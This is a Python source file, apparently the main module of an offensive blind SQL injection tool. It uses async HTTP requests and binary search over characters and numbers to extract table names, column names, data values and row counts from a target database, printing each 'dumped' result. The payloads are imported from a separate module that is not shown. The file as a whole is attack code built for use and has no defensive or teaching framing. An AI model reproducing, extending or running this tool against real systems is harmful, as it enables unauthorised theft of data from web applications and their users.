import aiohttp
import asyncio
import string
import sys
import argparse
#from core.payloads import (
#    table_name_payloads_boolen_based_blind,
#    column_name_payloads_boolen_based_blind,
#    entity_name_payloads_boolen_based_blind,
#    entity_count_payloads_boolen_based_blind,
#    table_name_payloads_union_based 
#)
from core.payloads import *
import re
import core.injection as injection
import core.config as cfg

############################################## TODO: add caching and sessions + logs + dumps  w__W


#special_chars = "_.@-:;[](){}/|!#$%^&*=+~" # TODO: add letter counter in words to fix endless spaces at the end


#async def binary_search(offset, position, nums, chars, session):
async def binary_search(session, data):
    nums = data['nums']
    chars = data['chars']
    if cfg.usr_mode == 'entity-count':
        left, right = 0, len(nums) - 1
    else:
        left, right = 0, len(chars) - 1
    
    while left <= right:
        data['general_name'] = general_name
        mid = (left + right) // 2 ########################################## fix this watafak ==>> ENTITY_COUNTER/entity-count
        if cfg.usr_mode == 'entity-count':
            data['num'] = nums[mid]
        else:
            data['char'] = chars[mid]
        
        if await injection.inject_payload(session, {**data, "operator": ">"}):
            left = mid + 1
        elif await injection.inject_payload(session, {**data, "operator": "="}):
            if cfg.usr_mode == 'entity-count':
                return nums[mid]
            else:
                return chars[mid]
        else:
            right = mid - 1

    return None

async def main():
    global general_name, entity_counter
    general_name = ""
    chars = sorted(string.ascii_lowercase + string.digits + "{}$()")
    nums = [str(i) for i in range(501)]
    entity_counter = 0
    position = 1
    
    sys.stdout.write("\n") 
    sys.stdout.flush()

    async with aiohttp.ClientSession() as session:
            while True:
                try:
                    data = {
                            "offset": cfg.usr_offset,
                            "position": position,
                            "operator": "=",
                            "nums": nums,
                            "chars": chars,
                            "general_name": general_name,
                            "entity_counter": entity_counter,
                            "char": "",
                            "num": ""
                    }

                    if cfg.usr_mode == 'entity-count':
                        #attack = await binary_search(offset, position, nums, chars, session)
                        attack = await binary_search(session, data)
                        if attack:
                            entity_counter = int(attack)
                            data['entity_counter'] = entity_counter
                            sys.stdout.write("\n")
                            print(f"[+] done. entities in column: ", entity_counter)
                            cfg.usr_offset += 1
                            entity_counter = 0
                            break
                    elif cfg.usr_mode == 'table-test' or cfg.usr_mode == 'column-test' or cfg.usr_mode == 'entity-test':
                        #qwe = await send_payload(usr_mode, usr_table, usr_column, offset, position, nums, chars, session, "=")
                        attack = await injection.inject_payload(session, data)
                        if attack:
                            pattern = r"/([^/?#]+)$"
                            match = re.search(pattern, str(attack))
                            sys.stdout.write("\n")
                            print(f"[+] done. data dumped [ {match.group(1)} ]")
                            #print(f"[+] done. dumped: {qwe}")
                            general_name = attack
                            #print(f"[+] done. data dumped: ", general_name)
                            cfg.usr_offset += 1
                            #break
                    else:
                        #tasks = [send_payload(usr_mode, usr_table, usr_column, offset, position, nums, char, session, "=") for char in special_chars]
                        tasks = [injection.inject_payload(session, {**data, "char": char}) for char in cfg.special_chars]
                        results = await asyncio.gather(*tasks)
                        
                        # prepared chars list
                        for i, char in enumerate(cfg.special_chars):
                            if results[i]:
                                general_name += char
                                position += 1
                                break
                        else:
                            # binary search
                            char = await binary_search(session, data)
                            if char:
                                general_name += char
                                position += 1
                            else:
                                sys.stdout.write("\n")
                                print(f"[+] done. data dumped: [{general_name}]\n")
                                cfg.usr_offset += 1
                                position = 1
                                general_name = ""
                                #break
            
                #except KeyboardInterrupt:
                except:
                    print("\n[!] Player paused the game...\r")
                    usr_abort = input("\n[?] Your choice [(c)ontinue/(e)nd this phase/(q)uit]: _")
                    if usr_abort == "e":
                        exit(0)
                    if usr_abort == "q":
                        print("\n[x] player left the game [x]")
                        #print("[----] g4m3 0v3r.>@$q../ [----]\n")
                        exit(0)

    return general_name, entity_counter

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        exit(0)
    except Exception as e:
        print("error: ", e)
        exit(0)
    finally:
        exit(0)
else:
    exit(0)
